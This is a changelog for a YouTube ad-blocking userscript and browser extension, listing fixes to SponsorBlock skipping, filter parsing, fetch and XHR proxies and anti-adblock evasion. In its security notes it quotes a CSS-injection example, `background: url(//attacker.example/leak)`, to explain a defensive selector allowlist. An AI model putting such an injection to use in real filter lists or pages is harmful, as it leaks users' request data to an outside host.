# Changelog

All notable changes to YoutubeAdblock are documented here.

## [0.3.1] - 2026-04-17

End-to-end hardening pass. No new features — every change either fixes a
real correctness, security, performance, or UX bug, or prevents a new
class of failure from reaching users.

### Fixed — correctness
- **SponsorBlock race on fast navigation.** Previously, if the user
  navigated from video A to video B while A's segments were still being
  fetched, A's segments could be applied to B's `<video>` element — the
  handler checked `videoId` at apply time but `videoId` still pointed at
  A because the second nav's `loadSponsorSegments(B)` early-returned on
  the `loading=true` flag. Replaced with a token-based guard (`loadingToken`)
  plus a `pendingVideoId` queue, and an extra URL re-check at apply time.
  A second URL check inside the `timeupdate` handler prevents any stale
  segments from firing on a mismatched video.
- **Segment de-dup + duration clamping in SponsorBlock.** Overlapping
  segments are now deterministically resolved by `start` order; segments
  with non-finite `start`/`end` are rejected; a seek past `video.duration`
  is clamped to `duration - 0.01` to avoid browser-side seek refusals.
- **Stats type safety.** A corrupt `stats` value in GM storage (e.g.
  `blocked: "NaN"` from an older version) silently poisoned every future
  increment into `NaN`. `loadState` now coerces each key to a finite
  non-negative integer with `Math.floor(Number(...))`, and all writes
  route through a new `incrementStat(name, by)` helper that guards
  against the object being replaced at runtime.
- **Video-ad fast-forward left the video muted after ad end.** The old
  code set `video.muted = true` whenever `.ad-showing` was present but
  never restored the muted state on the ad → content transition,
  silencing the subsequent real video. Now tracks whether **we** muted
  (distinct from the user's own mute) and only restores in that case.
- **Stale filter cache is kept active, not discarded.** A cache past its
  4-hour TTL used to be dropped in favor of the built-in defaults while
  the background refresh ran, visibly losing custom coverage for the
  first seconds of every page load. The stale copy now stays active
  under a new `'stale'` filter source, while the refresh runs in the
  background — user never sees a coverage gap.
- **Panel surviving SPA navigation.** A YouTube SPA nav that rewrote
  `<body>` could detach the control-center overlay; the next open kept
  the stale reference and attached handlers to an orphan. `toggleSettings`
  now drops the reference when the overlay is no longer connected, so
  the next open rebuilds cleanly.

### Fixed — security / safety
- **CSS-injection guard on remote filter lists.** Cosmetic selectors are
  now validated against an allowlist (no `{`, `}`, `;`, `<`, `>`, CSS
  comment terminators, or newlines) and capped at 400 characters each,
  5000 cosmetic selectors total, 500 upsell selectors total. Without
  this, a malicious or compromised filter list could inject
  `background: url(//attacker.example/leak)` and exfiltrate request
  context via rendered CSS. The check runs in the parser *and*
  defensively again at CSS-generation time, covering both freshly
  parsed and cached-from-older-versions selectors.
- **Scriptlet argument allowlisting.** `setUndefined` and prune-key
  paths from remote lists now have to match `identifier(.identifier)*`
  before being applied; anything with brackets, spaces, or quotes is
  rejected. Caps: 500 prune keys, 500 setUndefined paths.
- **Filter-list DoS bounds.** Parser bails after 50000 input lines.
- **Extension bridge hardening.** The `ytab:page-request` CustomEvent
  listener (visible to any page-world script, not just ours) now only
  accepts writes to a single allowlisted key, debounces writes at
  150 ms, rejects payloads over 512 KB, and rejects IDs longer than
  64 chars. Cross-subdomain sync only forwards the allowlisted key so
  no unrelated extension storage shape can leak into untrusted code.

### Fixed — performance
- **Fetch/XHR proxy fast-path.** A cheap substring scan (`responseTextMightContainAds`)
  skips the JSON parse + tree walk when the response body clearly has
  no ad field names, eliminating the bulk of wasted work on
  `/browse`, `/search`, `/next`, and `/guide` responses (typically
  hundreds of KB each, many per page). URL-scoped hints preserve the
  Shorts `isAd` path, which uses a key that isn't in `pruneKeys`.
- **Iframe bridge hot path.** Same-origin frames that have already been
  bridged carry a `__ytabBridged__` sentinel so repeat `contentWindow`
  reads become O(1) boolean checks instead of five reassignments; cross-
  origin frames are cached in a WeakMap so repeat reads don't keep
  triggering `cw.document`-access DOMExceptions. The cache is cleared
  on iframe `load` events so a frame that navigates between origins is
  re-probed.

### Fixed — UX
- **Sponsor-skipped metric tile.** Previously only surfaced in the
  small footer stats row; now sits in the main metric grid alongside
  Ads blocked / Responses pruned / SSAP skips. Grid switched to
  `auto-fit` so the count adapts to narrow panels.
- **Stale-filter status.** New `'Cached list (stale)'` source label
  surfaces when rules are being refreshed in the background.
- **Action-button reload fallback.** If the toolbar click arrives before
  the content script has loaded (common immediately after install),
  the service worker now reloads the tab instead of silently failing.

### Fixed — CI / build
- **Release auto-create on tag push.** Previous workflow called
  `gh release upload --clobber` which errors out if the release doesn't
  already exist; now calls `gh release view` and only `create`s when
  needed. Tag version must match the manifest version.
- **Tag/manifest version mismatch is now a hard fail.**
- **Concurrency guard** cancels stale workflow runs on the same ref
  so two retries can't race the upload.
- **Build script self-check.** `Build-Extension.ps1` now verifies the
  generated file contains all the expected shim + command-hook
  markers, and runs `node --check` on the output if Node is on PATH.
- **Ship-zip excludes `extension/README.md`** (dev-facing) from the
  shipped archive.

### Fixed — small bugs
- Cosmetic selector exceptions now apply to upsell selectors too, not
  just the main cosmetic list.
- Iframe-bridge `load` listener re-fires on every document swap (was
  `{ once: true }` — a frame that swapped documents more than once
  lost coverage after the first swap).
- `inertRecords` restoration on panel close correctly handles elements
  added after open (no longer tries to unwind state it never set).

## [0.3.0] - 2026-04-17

### Added — SponsorBlock
- **Silent SponsorBlock auto-skip.** Queries the [SponsorBlock](https://sponsor.ajay.app/)
  community database via the privacy-preserving hash-prefix endpoint
  (only the first 4 hex chars of `sha256(videoID)` leave the client;
  local filtering matches the exact videoID). Silently seeks past
  segments tagged `sponsor`, `selfpromo`, `interaction`, `intro`,
  `outro`, `preview`, `music_offtopic`, and `filler` with `actionType`
  of `skip` or `full`. No toast, no panel nudge — just quiet skips.
  Handled on `timeupdate` with per-segment de-duplication to avoid
  ping-pong when a skip lands near another segment's leading edge.
- New `sponsorSkipped` counter added to the stats footer and diagnostics
  report so you can confirm it's working without adding any visible
  notification to the video.

### Added — Chrome / Firefox MV3 extension
- **Structured extension build** at [extension/](extension/). The same
  ad-blocking engine as the userscript plus MV3-native superpowers:
  - **declarativeNetRequest rules** at [extension/rules/network-blocks.json](extension/rules/network-blocks.json)
    block `/pagead/`, `/api/stats/ads`, `/youtubei/v1/player/ad_break`,
    `/get_midroll_info`, `/ptracking`, googlevideo `ctier=SA` segments,
    doubleclick.net and googlesyndication.com (from YouTube initiators
    only), googleadservices.com, and `/api/stats/atr` ad telemetry at
    the **browser network layer**, where no page-level anti-adblock
    countermeasure can see them.
  - **MAIN-world content script** at `world: "MAIN"` injects the engine
    directly into the page context at `document_start` — no iframe
    trick, no `<script>` element needed. Chrome 111+ / Firefox 128+.
  - **Isolated-world bridge** at [extension/bridge.js](extension/bridge.js)
    mirrors settings into `chrome.storage.local` so a setting change
    on `www.youtube.com` propagates to `m.youtube.com` and
    `music.youtube.com` on the next load.
  - **Service worker** at [extension/background.js](extension/background.js)
    handles the toolbar action button, a 3-item right-click context
    menu ("Open control center / Pause-resume / Refresh rules"), and
    three keyboard commands including a default `Ctrl+Shift+Y` to open
    the panel.
- **One-shot build script** [Build-Extension.ps1](Build-Extension.ps1)
  converts [YoutubeAdblock.user.js](YoutubeAdblock.user.js) (single
  source of truth) into [extension/main.js](extension/main.js) by
  stripping the `==UserScript==` header, injecting `GM_*` shims
  (`localStorage` + `chrome.storage.local` mirror, `fetch`-backed
  `GM_xmlhttpRequest`), and wiring command-bridge listeners.
  Windows-first workflow, no build chain needed.

### Notes
- SponsorBlock fetches use `GM_xmlhttpRequest` in the userscript and
  native `fetch` in the extension build. Both endpoints
  (`sponsor.ajay.app`, `raw.githubusercontent.com`) send
  `Access-Control-Allow-Origin: *`, so the extension doesn't need a
  background-script proxy.
- The extension's DNR rules are additive, not a replacement for the
  page-level engine. Together they defend at three layers: network
  request (DNR), payload (JSON.parse/fetch/XHR proxies), and render
  (cosmetic CSS + enforcement-popup pruning).

## [0.2.1] - 2026-04-17

### Added
- **Iframe fetch-lift defense.** YouTube's 2026 anti-adblock pattern lifts
  pristine `fetch` / `XMLHttpRequest` / `JSON.parse` out of a freshly
  inserted same-origin iframe and uses that unhooked copy for ad delivery.
  `appendChild`, `insertBefore`, and `replaceChild` are now all proxied,
  and the `HTMLIFrameElement.prototype.contentWindow` getter is wrapped
  so every read rebridges our hooks into the child window. Cross-origin
  iframes are skipped (access throws, and YT can't lift usable globals
  across origins either). Only the network/parsing APIs are bridged —
  `Promise` and `setTimeout` are left alone so legitimate same-origin
  iframes aren't affected.
- **Aggressive anti-stall** (new anti-detection toggle). Targets the same
  bound-`setTimeout(…, 17000)` profile that uBO's `nano-stb, [native code],
  17000, 0.001` quick-fix rule hits. Narrowed to `delay === 17000` exactly
  (not the 16000–18000 window the marker-based neutralizer uses) to keep
  false-positives low on legitimate 17s bound timers. Disabled in the
  normal neutralizer path, so turning the toggle off restores v0.2.0
  behavior.
- **Video ad fast-forward** (new last-resort toggle). If the prune/intercept
  layers miss a payload and a client-side ad actually starts playing, the
  `.ad-showing` class on `#movie_player` triggers mute + 16x playback rate
  on the `<video>`, shaving unskippable ads to under a second without
  relying on `seekTo` (which YT can reject on some ad surfaces).
- **Wider pruneKey coverage.** Built-in filters now strip
  `adBreakHeartbeatParams`, `frameworkUpdates`, `responseContext.adSignalsInfo`,
  `playerResponse.adBreakHeartbeatParams`, and
  `(playerResponse.)auxiliaryUi.messageRenderers.upsellDialogRenderer` from
  every parsed response. `/youtubei/v1/guide` is now in the intercept
  patterns so the enforcement-popup payload is caught before it leaves
  the network layer, not just by cosmetic CSS after render.
- **Enforcement-popup cosmetic fallback.** `ytd-enforcement-message-view-model`
  and its `tp-yt-paper-dialog` wrapper are hidden by default if pruning ever
  lets one through.

### Notes
- The iframe `contentWindow` getter wrap is best-effort — if another
  script (e.g. another adblock userscript) has already locked the getter
  non-configurable, YoutubeAdblock skips it silently and the node-insertion
  proxies still cover the common path.
- Aggressive anti-stall only fires on bound/native functions at exactly
  17000 ms. If you see unrelated 17 s features running too fast, turn it
  off in the control center.

## [0.2.0] - 2026-04-17

### Added
- Background content becomes `inert` + `aria-hidden` while the control center
  is open so keyboard users and screen readers stay inside the dialog.
  Previously-set state on YouTube nodes is preserved and restored on close,
  rather than clobbered.
- Menu-triggered "Open Control Center" now builds the panel on demand if the
  user picks it before DOMContentLoaded; previously a no-op.
- Diagnostics report now includes timestamp, user agent, trapped roots,
  prune-key count, cosmetic selector count, and intercept patterns —
  enough context to triage a bug report without a follow-up.
- URL input preserves in-progress typing across settings panel rebuilds
  (feature toggles used to wipe the user's unsaved edit).
- Toast cap (4 visible) plus input-type sanitization so transient error
  bursts don't fill the viewport.
- Focus trap now pulls focus back into the panel if it escapes, not just on
  wrap-around.
- Feature toggles now expose `role="switch"` with `aria-checked` so
  assistive tech announces on/off state instead of generic tick/untick.
- Property traps now eagerly prune any already-populated root at install
  time, so ad fields a page-inline `<script>` committed before our trap
  installed no longer reach the first paint.
- SSAP polling pauses while the tab is hidden.
- Toggle inputs now carry `aria-describedby` pointing at the visible
  description so AT users hear *what the switch does*, not just its short
  label.
- Rule-source fetch errors now surface the underlying reason (`HTTP 404`,
  `exceeds 5MB limit`, `Invalid JSON filter schema`) rather than a generic
  "could not be parsed".
- `safeOverride` now logs one warning per locked property when another
  script has made the target non-configurable — helps diagnose conflicts
  with other YouTube adblock userscripts.
- `matchesInterceptPattern` compiles its patterns into a single RegExp
  once per-array-identity, replacing N `String#includes` iterations per
  request with a single regex match.
- A `<head>`-scoped `MutationObserver` re-applies the cosmetic stylesheet
  if YouTube or a detection script removes it. Observer is lazily attached
  on first cosmetic update so we don't spend the MutationObserver budget
  before the stylesheet actually matters.
- Overlay `aria-hidden` is now **removed** rather than set to `"false"`
  when the dialog opens — explicit `aria-hidden="false"` conflicts with
  ancestor inheritance in some assistive tech.
- Feature counts (`Modules enabled`, `N/M on` pills) now count the
  canonical feature set rather than whatever keys a cached filter payload
  happens to carry. A stale cache with orphan keys no longer inflates
  the displayed module count.
- `Intl.NumberFormat` and `Intl.DateTimeFormat` are now lazily
  instantiated once and reused. Previously every stats tick and every
  chip re-render constructed a new formatter.

### Fixed
- **Property traps now cover every declared path.** The previous implementation called `Object.defineProperty` on `window.ytInitialPlayerResponse` once per configured path, so only the first (`playerAds`) succeeded and `adPlacements`, `adSlots`, and `adBreakHeartbeatParams` were never trapped. Paths are now grouped by root and handled together.
- **Timer neutralization no longer breaks YouTube's own 17s callbacks.** The old heuristic matched `[native code]` (which every bound function prints) and any callback shorter than 50 characters; both fired legitimate timers at 1ms. The tightened rule only fires on callbacks containing known anti-adblock markers (`onAbnormal`, `adBlock`, `abnormalityDetected`) and ignores bound/native functions entirely.
- **XHR proxy honors `responseType='json'`.** Previously, rewriting the response handed callers a string when they had requested an object, breaking YouTube code paths that parse by responseType. The proxy now inspects `responseType` and serializes/parses appropriately; binary responseTypes are skipped.
- **Blocked counter no longer inflates.** Fetch interception incremented the counter on every intercepted URL (not just actual blocks) and double-counted via the already-proxied `JSON.parse`. The fetch and XHR proxies now bypass the JSON.parse proxy using a captured original and only count actual rewrites.
- **Shorts ad pruning is scoped by URL.** The prior implementation filtered any parsed JSON containing an `entries` array, which could silently remove non-ad entries from unrelated YouTube payloads. Shorts pruning now only runs when the URL matches `reel_watch_sequence` / `/reel`.
- **Remote filter updates now re-apply property traps.** New roots introduced by remote rules get guarded, and new subpaths on already-trapped roots are picked up via a shared mutable map instead of being closed over statically.
- **Cosmetic stylesheet self-heals after SPA nav.** The cached reference is now validated with `isConnected` before reuse so a `<head>` rewrite no longer freezes cosmetic cleanup.
- **Focus and scroll preserved across settings rebuilds.** Toggling a feature no longer yanks keyboard focus to the top of the panel.
- **Pause/Resume menu command now reflects current state.** The label is re-registered whenever protection is toggled (where `GM_unregisterMenuCommand` is available).
- **Filter URL validated on load.** A corrupted saved value is silently replaced with the default instead of stranding the user with a broken source.

### Performance
- SSAP auto-skip replaced `MutationObserver` on the whole document (firing thousands of times per second on YouTube) with a 1-second poll of the player's debug info.
- `Promise.prototype.then` abnormality check now caches decisions per-function in a `WeakSet`, so hot Promise chains avoid repeat `Function.prototype.toString` calls.
- Stats persistence is debounced by 2s so fast-firing ad-pruning paths no longer touch GM storage on every object.
- The panel stats refresh loop only repaints while the control center is open.
- `replaceAdKeys` caches its compiled RegExp array by source and reuses it across all fetch/XHR interceptions.
- Three internal `JSON.parse` call sites (filter fetch, outbound fetch body rewrite, outbound XHR body rewrite) now bypass our own JSON.parse proxy via a captured original, avoiding unnecessary re-entry into `pruneObject` on payloads that definitionally contain no ad keys.

### Security / safety
- Remote filter lists are now capped at 5MB and the HTTP status is verified before parsing; malformed or oversized responses are rejected.
- `@connect *` added so users who configure a custom filter URL on a non-GitHub host can actually fetch it (previously blocked by Tampermonkey's connect policy).
- Fetch proxy skips rewriting non-JSON responses by inspecting `Content-Type`, reducing the chance of mangling unintended payloads.
- Rewritten responses strip `Content-Length` so strict consumers reading the declared length against the new payload don't see a mismatch.
- `GM_getValue`/`GM_setValue` are wrapped in try/catch; a corrupted key or quota rejection no longer throws past the caller.
- XHR proxy coerces the `url` arg to a string so a `URL` instance passed to `open()` (legal per spec) cannot trip `String#includes`.

### UX
- Expanded `interceptPatterns` to match the endpoints the README advertises (`/youtubei/v1/browse`, `/search`, `/next`).
- Cache-busting query string now correctly joins with `&` when the URL already contains `?`.

### Chore
- `@downloadURL` / `@updateURL` / `@homepageURL` / `@supportURL` now use canonical repo casing (`YoutubeAdblock`).
- Dropped the unused `networkBlocks` accumulator and the unused `shortsAdPrune` field from `DEFAULT_FILTERS`.

## [0.1.1] - 2026-04-16

- Added a redesigned in-product control center with stronger hierarchy, live status, diagnostics, and calmer feedback states.
- Added a real master switch, runtime-safe feature toggles, timer neutralization controls, and better rule-source refresh handling.
- Added first-run guidance plus extra userscript menu commands for opening the control center, pausing or resuming protection, and refreshing rules.
- Improved destructive-action UX by replacing native confirmation prompts with an in-context two-step confirmation flow.
- Refined the README and changelog so onboarding, configuration, and versioning better match the current product surface.

## [0.0.3]

- Earlier repository snapshot before the 0.1.x control-center and UX refinement work.
